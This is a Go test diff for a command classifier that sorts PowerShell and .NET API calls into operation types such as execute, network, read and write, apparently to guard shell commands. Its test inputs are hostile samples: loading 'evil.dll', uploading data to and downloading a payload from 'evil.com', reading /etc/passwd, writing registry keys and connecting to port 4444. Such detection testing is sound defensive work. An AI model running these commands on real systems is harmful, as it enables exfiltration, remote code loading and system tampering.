@@ -4066,6 +4066,93 @@ func TestPSCmdletAlias_Lookup(t *testing.T) {
 	}
 }
 
+// TestCommandDB_DotNetAPIs verifies that the commandDB entries for .NET static
+// APIs (BUG 4) resolve to the expected Operation via the heuristic path (no
+// pwsh worker). Each command uses the [Type]::Method("arg") syntax which the
+// bash parser sees as a plain command name; normalizeParsedCmdName lowercases
+// the "::" form so the commandDB lookup succeeds cross-platform.
+func TestCommandDB_DotNetAPIs(t *testing.T) {
+	ext := NewExtractor()
+
+	tests := []struct {
+		name    string
+		command string
+		wantOp  Operation
+	}{
+		// System.Reflection.Assembly — dynamic code loading → OpExecute (BUG 4)
+		{
+			name:    "Assembly::LoadFile",
+			command: `[System.Reflection.Assembly]::LoadFile("C:\evil.dll")`,
+			wantOp:  OpExecute,
+		},
+		{
+			name:    "Assembly::LoadFrom UNC path",
+			command: `[System.Reflection.Assembly]::LoadFrom("\\server\share\evil.dll")`,
+			wantOp:  OpExecute,
+		},
+		{
+			name:    "Assembly::Load",
+			command: `[System.Reflection.Assembly]::Load("MaliciousAssembly")`,
+			wantOp:  OpExecute,
+		},
+		// System.Net.WebClient — additional methods → OpNetwork (BUG 4)
+		{
+			name:    "WebClient::UploadData",
+			command: `(New-Object System.Net.WebClient).UploadData("http://evil.com/collect", $data)`,
+			wantOp:  OpNetwork,
+		},
+		{
+			name:    "WebClient::DownloadData",
+			command: `(New-Object System.Net.WebClient).DownloadData("http://evil.com/payload")`,
+			wantOp:  OpNetwork,
+		},
+		// System.IO stream types → OpRead/OpWrite (BUG 4)
+		{
+			name:    "StreamReader constructor",
+			command: `[System.IO.StreamReader]::new("/etc/passwd")`,
+			wantOp:  OpRead,
+		},
+		{
+			name:    "StreamWriter constructor",
+			command: `[System.IO.StreamWriter]::new("/tmp/out.txt")`,
+			wantOp:  OpWrite,
+		},
+		{
+			name:    "FileStream constructor",
+			command: `[System.IO.FileStream]::new("/tmp/data.bin", [System.IO.FileMode]::Open)`,
+			wantOp:  OpRead,
+		},
+		// Microsoft.Win32.Registry → OpRead/OpWrite (BUG 4)
+		{
+			name:    "Registry::GetValue",
+			command: `[Microsoft.Win32.Registry]::GetValue("HKEY_LOCAL_MACHINE\SOFTWARE", "key", $null)`,
+			wantOp:  OpRead,
+		},
+		{
+			name:    "Registry::SetValue",
+			command: `[Microsoft.Win32.Registry]::SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\App", "key", "val")`,
+			wantOp:  OpWrite,
+		},
+		// System.Net.Sockets.TcpClient → OpNetwork (BUG 4)
+		{
+			name:    "TcpClient::Connect",
+			command: `$tcp.Connect("evil.com", 4444)`,
+			wantOp:  OpNetwork,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			argsJSON, _ := json.Marshal(map[string]string{"command": tt.command})
+			info := ext.Extract("Bash", json.RawMessage(argsJSON))
+			t.Logf("Operation=%v Evasive=%v Paths=%v", info.Operation, info.Evasive, info.Paths)
+			if info.Operation != tt.wantOp {
+				t.Errorf("Operation = %v, want %v", info.Operation, tt.wantOp)
+			}
+		})
+	}
+}
+
 // TestDualParse_NoDuplicatePaths verifies that when a command is valid bash AND
 // looks like PowerShell, the paths extracted by both parsers are not duplicated
 // in info.Paths.
